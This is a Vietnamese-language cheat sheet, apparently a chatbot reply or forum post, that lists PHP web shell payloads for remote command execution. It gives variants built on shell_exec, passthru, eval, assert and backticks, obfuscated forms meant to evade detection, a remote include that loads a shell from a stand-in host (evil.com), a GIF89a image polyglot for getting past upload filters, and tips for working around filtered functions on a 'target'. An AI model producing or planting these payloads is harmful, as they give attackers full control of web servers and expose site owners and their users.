>```<?php system(\$_GET['cmd']); ?>```

---

### 🔥 **Top payload PHP RCE thay thế `system($_GET['cmd'])`:**

#### 1. **Các biến thể cùng chức năng:**

```php
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php eval("?>".file_get_contents("php://input")); ?>
<?php assert($_POST['cmd']); ?>
<?php exec($_GET['cmd']); ?>
<?=$_GET['cmd']?> // short-tag, nếu short_open_tag enabled
```

---

### 🕵️‍♂️ **Evasion / Obfuscation (né detection):**

#### 2. **Obfuscate nhẹ bằng biến và hàm:**

```php
<?php $f = 'system'; $f($_GET['cmd']); ?>
<?php ${'sys'.'tem'}($_REQUEST['cmd']); ?>
<?php $a="cmd"; system($_GET[$a]); ?>
```

---

#### 3. **Base64 decode rồi eval:**

```php
<?php eval(base64_decode("c3lzdGVtKCRfR0VUWydjbWQnXSk7")); ?>
// Decode ra: system($_GET['cmd']);
```

---

#### 4. **Tải mã độc từ xa (webshell nhẹ):**

```php
<?php @include($_GET['load']); ?>
// gọi: ?load=http://evil.com/shell.txt
```

---

#### 5. **Dùng input/output stream:**

```php
<?php echo `$_GET[0]`; ?>
<?php echo file_get_contents('php://input'); ?>
```

---

#### 6. **Polyglot + Fake Extension:**

* Đặt payload vào `.jpg`, `.gif`, `.txt`, nhưng thêm payload ở đuôi hoặc EXIF.
* File `.jpg` nhưng nội dung là:

```php
GIF89a<?php system($_GET['cmd']); ?>
```

---

### 🧠 **Tips thực chiến:**

* Nếu PHP-FPM xử lý tất cả `.jpg`, `.txt` (CVE-2019-11043 kiểu), thì đuôi không quan trọng.
* Khi bị filter `system`, `exec`, `passthru` → dùng eval + base64 hoặc hàm gián tiếp (`call_user_func`, `create_function`).
* Nếu bị filter cả `eval` → thử **assert** vì `assert('code');` = eval trong PHP.

---

### 📌 **Payload gợi ý bu xài nếu target khó chịu:**

```php
<?php $a=base64_decode("c3lzdGVt"); $a($_REQUEST['c']); ?>
// gọi: ?c=id
```
